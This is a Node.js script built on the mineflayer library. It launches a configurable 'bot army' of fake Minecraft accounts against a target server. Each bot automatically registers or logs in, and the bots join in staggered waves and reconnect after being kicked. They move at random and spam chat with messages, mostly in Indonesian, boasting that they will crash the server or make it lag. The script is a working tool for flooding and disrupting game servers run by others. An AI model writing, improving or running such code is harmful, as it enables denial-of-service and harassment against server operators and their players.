const mineflayer = require('mineflayer');
const fs = require('fs-extra');
const path = require('path');
const config = require('./config.json');

// Ensure directories exist
const botsDir = path.join(__dirname, 'bots');
const logsDir = path.join(__dirname, 'logs');
fs.ensureDirSync(botsDir);
fs.ensureDirSync(logsDir);

// Load credentials
const credPath = path.join(botsDir, 'credentials.json');
let credentials = fs.existsSync(credPath) ? fs.readJsonSync(credPath) : {};

// Track active bots
const activeBots = new Map();

// ANSI color codes for console output
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  cyan: '\x1b[36m'
};

// Logger function with colors and file output
function log(botName, message, type = 'info') {
  try {
    const timestamp = new Date().toLocaleTimeString();
    const date = new Date().toISOString().split('T')[0];
    const logFile = path.join(logsDir, `${botName}-${date}.log`);
    const logMessage = `[${timestamp}] [${botName}] ${message}`;
    
    // Choose color based on message type
    let color = colors.reset;
    if (type === 'error') color = colors.red;
    else if (type === 'success') color = colors.green;
    else if (type === 'warning') color = colors.yellow;
    else if (type === 'system') color = colors.cyan;
    
    // Console output
    console.log(`${color}${logMessage}${colors.reset}`);
    
    // File output
    fs.appendFileSync(logFile, `${logMessage}\n`);
  } catch (err) {
    console.error(`Logging error: ${err.message}`);
  }
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Creates and manages a bot
async function createBot(index) {
  const username = `${config.prefix}${index}`;
  let reconnectAttempts = 0;
  const maxReconnectAttempts = 5;
  let reconnectDelay = 5000; // Start with 5 seconds
  
  async function connect() {
    try {
      // Remove old bot if exists
      if (activeBots.has(username)) {
        const oldBot = activeBots.get(username);
        if (oldBot && oldBot.end) oldBot.end();
        activeBots.delete(username);
      }
      
      // Create new bot
      const bot = mineflayer.createBot({
        host: config.host,
        port: config.port,
        username,
        version: config.version,
        keepAlive: true,
        checkTimeoutInterval: 30000,
        viewDistance: 'tiny', // Reduce network load
      });
      
      activeBots.set(username, bot);
      
      // Set up all event handlers
      setupEventHandlers(bot, username);
      
      return bot;
    } catch (error) {
      log(username, `Failed to create bot: ${error.message}`, 'error');
      return null;
    }
  }
  
  function setupEventHandlers(bot, username) {
    // Spawn handler
    bot.once('spawn', async () => {
      log(username, 'Spawned', 'success');
      
      try {
        // Handle authentication
        if (!credentials[username]) {
          await delay(1000 + Math.random() * 1000);
          bot.chat(`/register ${config.password} ${config.password}`);
          credentials[username] = config.password;
          fs.writeJsonSync(credPath, credentials, { spaces: 2 });
          log(username, 'Registered', 'success');
        } else {
          await delay(1000 + Math.random() * 1000);
          bot.chat(`/login ${credentials[username]}`);
          log(username, 'Login attempted', 'info');
        }
        
        // Start bot activities
        startBotActivities(bot, username);
        
        // Reset reconnection attempts on successful spawn
        reconnectAttempts = 0;
        reconnectDelay = 5000;
      } catch (error) {
        log(username, `Error during spawn: ${error.message}`, 'error');
      }
    });
    
    // Message handler for login detection
    bot.on('message', (message) => {
      const msg = message.toString().toLowerCase();
      
      // Log all messages
      log(username, `Chat: ${message.toString()}`, 'info');
      
      // Handle login success/failure messages
      if (msg.includes('success') && msg.includes('log')) {
        log(username, 'Login successful', 'success');
      } else if ((msg.includes('wrong password') || msg.includes('failed')) && msg.includes('log')) {
        log(username, 'Login failed', 'error');
        
        // Try to login again after delay
        setTimeout(() => {
          if (bot.entity) {
            bot.chat(`/login ${credentials[username]}`);
            log(username, 'Retrying login...', 'warning');
          }
        }, 3000);
      }
    });
    
    // Disconnection handler
    bot.on('end', async () => {
      log(username, 'Disconnected', 'warning');
      activeBots.delete(username);
      
      // Attempt to reconnect with exponential backoff
      if (reconnectAttempts < maxReconnectAttempts) {
        reconnectAttempts++;
        log(username, `Reconnecting in ${reconnectDelay/1000}s (Attempt ${reconnectAttempts}/${maxReconnectAttempts})`, 'warning');
        
        setTimeout(async () => {
          await connect();
          // Increase delay for next attempt
          reconnectDelay = Math.min(reconnectDelay * 1.5, 30000);
        }, reconnectDelay);
      } else {
        log(username, 'Max reconnection attempts reached', 'error');
      }
    });
    
    // Error handler
    bot.on('error', (err) => {
      log(username, `Error: ${err.message}`, 'error');
    });
    
    // Kick handler
    bot.on('kicked', (reason, loggedIn) => {
      try {
        const parsedReason = typeof reason === 'string' ? JSON.parse(reason) : reason;
        const reasonStr = typeof parsedReason === 'object' ? JSON.stringify(parsedReason) : parsedReason;
        log(username, `Kicked: ${reasonStr}`, 'error');
      } catch (e) {
        log(username, `Kicked: ${reason}`, 'error');
      }
    });
    
    // Health updates
    bot.on('health', () => {
      if (bot.health < 5) {
        log(username, `Low health: ${bot.health}`, 'warning');
      }
    });
    
    // Player tracking
    bot.on('playerJoined', (player) => {
      log(username, `Player joined: ${player.username}`);
    });
    
    bot.on('playerLeft', (player) => {
      log(username, `Player left: ${player.username}`);
    });
    
    // Movement error handler (to prevent crashes)
    bot.on('moveEntityError', (entity) => {
      log(username, `Move entity error with ${entity.name || entity.username || 'entity'}`, 'error');
    });
  }
  
  // Start the bot behaviors
  function startBotActivities(bot, username) {
    // Custom messages for spam
    const messages = [
      `${username} siap menghancurkan server! 🔥`,
      `Server ini akan down oleh ${username}! 💣`,
      `${username} tidak terkalahkan! ⚔️`,
      `Bot army telah datang! 🤖`,
      `Resistance is futile! ${username} is here! 🛡️`,
      `${username} akan membuat server lag! 📉`,
      `Jangan coba melawan ${username}! 👑`,
      `${username} telah bangkit! 🧟`
    ];
    
    // More complex movements
    const moveIntervals = [];
    
    // Jump around
    moveIntervals.push(setInterval(() => {
      if (bot.entity) {
        bot.setControlState('jump', true);
        setTimeout(() => bot.setControlState('jump', false), 350);
      }
    }, 5000 + Math.random() * 7000));
    
    // Random movement
    moveIntervals.push(setInterval(() => {
      if (bot.entity) {
        const movements = ['forward', 'back', 'left', 'right'];
        const movement = movements[Math.floor(Math.random() * movements.length)];
        
        bot.setControlState(movement, true);
        setTimeout(() => {
          bot.setControlState(movement, false);
        }, 500 + Math.random() * 1000);
        
        // Random look
        bot.look(Math.random() * Math.PI * 2, Math.random() * Math.PI - Math.PI/2);
      }
    }, 3000 + Math.random() * 5000));
    
    // Chat spam with random messages
    moveIntervals.push(setInterval(() => {
      if (bot.entity) {
        const message = messages[Math.floor(Math.random() * messages.length)];
        bot.chat(message);
      }
    }, 10000 + Math.random() * 5000));
    
    // Clean up intervals on disconnect
    bot.once('end', () => {
      moveIntervals.forEach(interval => clearInterval(interval));
    });
  }
  
  // Start the bot
  return await connect();
}

// Start system
(async () => {
  try {
    // Show startup message
    log('SYSTEM', `Starting bot army for ${config.host}:${config.port}`, 'system');
    log('SYSTEM', `Targeting Minecraft ${config.version} with ${config.totalBots} bots`, 'system');
    
    // Launch bots with staggered timing
    for (let i = config.startIndex; i < config.startIndex + config.totalBots; i++) {
      createBot(i);
      await delay(500 + Math.random() * 500);
    }
    
    // Log status periodically
    setInterval(() => {
      const uptime = process.uptime();
      const minutes = Math.floor(uptime / 60);
      const seconds = Math.floor(uptime % 60);
      log('SYSTEM', `Status: ${activeBots.size}/${config.totalBots} bots active, uptime: ${minutes}m ${seconds}s`, 'system');
    }, 60000);
  } catch (err) {
    log('SYSTEM', `CRITICAL ERROR: ${err.message}`, 'error');
    console.error(err);
  }
})();
